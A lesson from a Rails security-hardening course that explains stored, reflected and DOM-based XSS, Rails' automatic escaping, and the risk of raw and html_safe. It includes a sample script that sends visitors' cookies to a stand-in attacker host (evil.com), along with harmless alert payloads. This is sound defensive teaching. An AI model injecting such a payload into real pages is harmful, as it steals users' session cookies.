---
source_course: "rails-security-hardening"
source_lesson: "rails-security-understanding-xss"
---

# Understanding XSS

Cross-Site Scripting (XSS) occurs when attackers inject malicious scripts into web pages viewed by other users.

## How XSS Works

Imagine a comment system that displays user input:

```html
<!-- If user submits this as a comment -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

If rendered without escaping, every visitor's cookies are sent to the attacker.

## Types of XSS

### Stored XSS
Malicious script is saved in the database and served to all users:
```ruby
# User saves this as their bio
<img src=x onerror="alert('XSS')">
```

### Reflected XSS
Malicious script in URL parameters reflected in the page:
```
https://example.com/search?q=<script>evil()</script>
```

### DOM-based XSS
Vulnerability in client-side JavaScript that manipulates the DOM.

## Rails' Automatic Protection

Rails automatically escapes HTML in ERB templates:

```erb
<!-- This is safe - Rails escapes the output -->
<p><%= @comment.body %></p>

<!-- If body contains <script>alert('XSS')</script> -->
<!-- It renders as: &lt;script&gt;alert('XSS')&lt;/script&gt; -->
```

## When Protection is Bypassed

The `raw` and `html_safe` methods bypass escaping:

```erb
<!-- DANGEROUS - renders raw HTML -->
<%= raw @user_content %>
<%= @user_content.html_safe %>
```

Only use these with content you fully control or have sanitized.

See [XSS Security Guide](https://guides.rubyonrails.org/security.html#cross-site-scripting-xss).

---

> 📘 *This lesson is part of the [Rails Security Hardening](https://stanza.dev/courses/rails-security-hardening) course on [Stanza](https://stanza.dev) — the IDE-native learning platform for developers.*